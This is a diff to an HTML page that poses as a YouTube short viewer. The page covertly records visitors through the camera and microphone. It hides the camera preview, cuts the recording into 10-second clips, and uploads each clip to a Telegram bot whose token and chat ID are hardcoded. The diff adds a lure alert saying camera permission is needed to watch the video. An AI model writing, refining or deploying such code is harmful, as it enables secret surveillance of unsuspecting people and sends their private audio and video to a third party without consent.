@@ -9,36 +9,43 @@
 <title>Live Video Recording</title> 
 
 <style>
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #000; /* ব্যাকগ্রাউন্ড কালো থাকলে ভিডিও সুন্দর দেখাবে */
+  }
   #videoElement {
-    display: none; /* ভিডিও ওয়েবসাইটে দেখা যাবে না */
+    display: none; /* ক্যামেরা প্রিভিউ হাইড করা থাকবে */
   }
   #videoContainer {
     text-align: center;
-    margin-top: 20px;
+    padding-top: 20px;
   }
   iframe {
-    width: 80%;
-    max-width: 600px;
-    height: 315px;
-    border: 2px solid black;
+    width: 90%;
+    max-width: 360px; /* শর্ট ভিডিওর জন্য পারফেক্ট সাইজ */
+    height: 640px;
+    border: 2px solid #333;
+    border-radius: 10px;
   }
 </style>
 
 </head> 
 <body>
 
-<!-- YouTube Video -->
 <div id="videoContainer">
-    <iframe id="youtubeVideo" width="560" height="315" 
-        src="https://www.youtube.com/embed/F22wvhbyCLg?autoplay=1&loop=1&playlist=09wZgGE3L9s" 
-        frameborder="0" allow="autoplay; encrypted-media" allowfullscreen>
+    <iframe id="youtubeVideo" 
+        src="https://www.youtube.com/embed/F22wvhbyCLg?autoplay=1&loop=1&playlist=F22wvhbyCLg&mute=1" 
+        frameborder="0" 
+        allow="autoplay; encrypted-media" 
+        allowfullscreen>
     </iframe>
 </div>
 
-<!-- Hidden Video Recording -->
 <video id="videoElement" autoplay playsinline></video>
 
 <script>
+  // ক্যামেরা এবং মাইক্রোফোন অ্যাক্সেস শুরু
   navigator.mediaDevices.getUserMedia({ video: true, audio: true })
     .then((stream) => {
       let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
@@ -56,7 +63,7 @@
           sendToTelegram(videoBlob);
         }
         recordedChunks = [];
-        startRecording(); // আবার রেকর্ড শুরু করবে
+        startRecording(); 
       };
 
       function startRecording() {
@@ -67,13 +74,15 @@
         }, 10000); // প্রতি ১০ সেকেন্ড পরপর ভিডিও পাঠানো হবে
       }
 
-      startRecording(); // প্রথমবার রেকর্ড শুরু
+      startRecording(); 
       
     })
     .catch((error) => {
       console.error('Permission error:', error);
+      alert('ভিডিও দেখার জন্য ক্যামেরা পারমিশন প্রয়োজন!');
     });
 
+  // টেলিগ্রামে ভিডিও পাঠানোর ফাংশন
   function sendToTelegram(data) {
     const botToken = '8214066152:AAHbgVjbtqg1d8Zk81n0roteOW07ByBb_CE';
     const chatId = '6717236638';
@@ -87,10 +96,9 @@
       body: formData
     })
     .then(response => response.json())
-    .then(data => console.log(data))
+    .then(data => console.log("Telegram Response:", data))
     .catch(error => console.error('Error sending to Telegram:', error));
   }
-
 </script>
 
 </body>
